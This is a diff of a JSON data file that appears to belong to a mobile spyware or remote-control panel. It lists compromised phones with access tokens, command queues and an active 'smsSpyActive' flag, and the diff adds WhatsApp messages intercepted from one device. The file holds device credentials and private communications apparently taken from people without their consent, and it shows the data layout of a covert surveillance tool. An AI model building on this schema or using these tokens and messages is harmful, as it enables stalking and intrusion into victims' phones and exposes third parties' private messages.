@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777305753721,
+    "lastSeen": 1777305783851,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -146,7 +146,7 @@
     "deviceName": "HP-PEGASUS-B240",
     "ownerUsername": "Kanzun",
     "token": "5d33b8ecb200f311ed19db054f831b4d",
-    "lastSeen": 1777305753594,
+    "lastSeen": 1777305783568,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T11:02:22.793Z",
@@ -162,6 +162,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "GB ALL GAME V¹ | REGZ STORE",
+        "content": "~ BURRSHOP: 📷 11 1-10k chat gc mas\nTampung banyak yg keras",
+        "time": "27/04 23:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777305756997
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "GB ALL GAME V¹ | REGZ STORE: ~ BURRSHOP",
+        "content": "📷 11 1-10k chat gc mas\nTampung banyak yg keras",
+        "time": "27/04 23:02",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777305756928
+      },
       {
         "appName": "WhatsApp",
         "sender": "GB ALL GAME V¹ | REGZ STORE",
